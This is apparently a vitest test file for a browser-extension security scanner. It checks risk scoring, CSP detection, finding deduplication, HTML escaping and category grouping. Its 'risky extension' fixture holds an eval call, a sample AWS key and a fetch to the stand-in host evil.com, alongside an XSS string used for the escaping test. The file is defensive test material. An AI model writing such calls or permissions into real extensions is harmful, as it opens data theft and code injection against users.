import { describe, it, expect } from 'vitest';
import {
  generateScanReport,
  generateHtmlReport,
  groupFindingsByCategory,
} from '../../src/report/generator';
import type { ScanInput, RiskFinding } from '../../src/types';

function makeSafeInput(): ScanInput {
  return {
    manifest: {
      manifest_version: 3,
      name: 'Safe Extension',
      version: '1.0.0',
      permissions: ['storage', 'activeTab'],
      host_permissions: [],
      content_security_policy: { extension_pages: "script-src 'self'; object-src 'self'" },
    },
    files: {
      'background.js': 'console.log("hello");',
    },
  };
}

function makeRiskyInput(): ScanInput {
  return {
    manifest: {
      manifest_version: 3,
      name: 'Risky Extension',
      version: '1.0.0',
      permissions: ['tabs', 'cookies', 'webRequest', 'webRequestBlocking', 'scripting'],
      host_permissions: ['<all_urls>'],
      content_security_policy: { extension_pages: "script-src 'self' 'unsafe-eval' 'unsafe-inline'" },
      content_scripts: [
        { matches: ['<all_urls>'], js: ['content.js'], all_frames: true },
      ],
    },
    files: {
      'background.js':
        'const key = "AKIAIOSFODNN7EXAMPLE";\neval("alert(1)");\nfetch("http://evil.com/data");',
      'content.js': 'document.write("<h1>injected</h1>");',
      'index.html': '<script src="https://cdn.example.com/lib.js"></script>',
    },
  };
}

describe('generateScanReport', () => {
  it('generates a report for a safe extension', () => {
    const report = generateScanReport(makeSafeInput());
    expect(report.extensionName).toBe('Safe Extension');
    expect(report.extensionVersion).toBe('1.0.0');
    expect(report.manifestVersion).toBe(3);
    expect(report.riskScore).toBeLessThanOrEqual(20);
    expect(report.riskLevel).toBe('low');
    expect(report.id).toBeTruthy();
    expect(report.scannedAt).toBeTruthy();
  });

  it('generates a report for a risky extension', () => {
    const report = generateScanReport(makeRiskyInput());
    expect(report.extensionName).toBe('Risky Extension');
    expect(report.riskScore).toBeGreaterThan(50);
    expect(report.findings.length).toBeGreaterThan(0);
    expect(report.summary.total).toBeGreaterThan(0);
  });

  it('throws on invalid manifest', () => {
    expect(() =>
      generateScanReport({
        manifest: {
          manifest_version: 3,
          name: '',
          version: '1.0',
          permissions: [],
          host_permissions: [],
        },
        files: {},
      })
    ).toThrow('Invalid manifest');
  });

  it('includes permission report', () => {
    const report = generateScanReport(makeRiskyInput());
    expect(report.permissions.declared.length).toBeGreaterThan(0);
    expect(report.permissions.dangerous.length).toBeGreaterThan(0);
  });

  it('includes CSP report', () => {
    const report = generateScanReport(makeRiskyInput());
    expect(report.csp.hasUnsafeEval).toBe(true);
  });

  it('includes metadata when provided', () => {
    const input = makeSafeInput();
    input.metadata = { name: 'Safe Extension', version: '1.0.0', developer: 'Test Dev' };
    const report = generateScanReport(input);
    expect(report.metadata?.developer).toBe('Test Dev');
  });

  it('deduplicates findings', () => {
    const report = generateScanReport(makeRiskyInput());
    const ids = report.findings.map((f) => `${f.id}:${f.file}:${f.line}`);
    expect(new Set(ids).size).toBe(ids.length);
  });
});

describe('generateHtmlReport', () => {
  it('generates valid HTML', () => {
    const report = generateScanReport(makeSafeInput());
    const html = generateHtmlReport(report);
    expect(html).toContain('<!DOCTYPE html>');
    expect(html).toContain('Safe Extension');
    expect(html).toContain('ExtensionShield');
  });

  it('includes all severity counts', () => {
    const report = generateScanReport(makeRiskyInput());
    const html = generateHtmlReport(report);
    expect(html).toContain('Critical');
    expect(html).toContain('High');
    expect(html).toContain('Medium');
    expect(html).toContain('Low');
  });

  it('escapes HTML in findings', () => {
    const input: ScanInput = {
      manifest: {
        manifest_version: 3,
        name: '<script>alert(1)</script>',
        version: '1.0',
        permissions: [],
        host_permissions: [],
      },
      files: {},
    };
    const report = generateScanReport(input);
    const html = generateHtmlReport(report);
    expect(html).not.toContain('<script>alert(1)</script>');
    expect(html).toContain('&lt;script&gt;');
  });
});

describe('groupFindingsByCategory', () => {
  it('groups findings by category', () => {
    const findings: RiskFinding[] = [
      {
        id: '1',
        category: 'permission',
        severity: 'high',
        title: 't',
        description: 'd',
        suggestion: 's',
      },
      {
        id: '2',
        category: 'csp',
        severity: 'medium',
        title: 't',
        description: 'd',
        suggestion: 's',
      },
      {
        id: '3',
        category: 'permission',
        severity: 'low',
        title: 't',
        description: 'd',
        suggestion: 's',
      },
    ];
    const groups = groupFindingsByCategory(findings);
    const permGroup = groups.find((g) => g.category === 'permission');
    expect(permGroup!.findings).toHaveLength(2);
    const cspGroup = groups.find((g) => g.category === 'csp');
    expect(cspGroup!.findings).toHaveLength(1);
  });

  it('returns all categories even when empty', () => {
    const groups = groupFindingsByCategory([]);
    expect(groups).toHaveLength(10);
    expect(groups.every((g) => g.findings.length === 0)).toBe(true);
  });
});
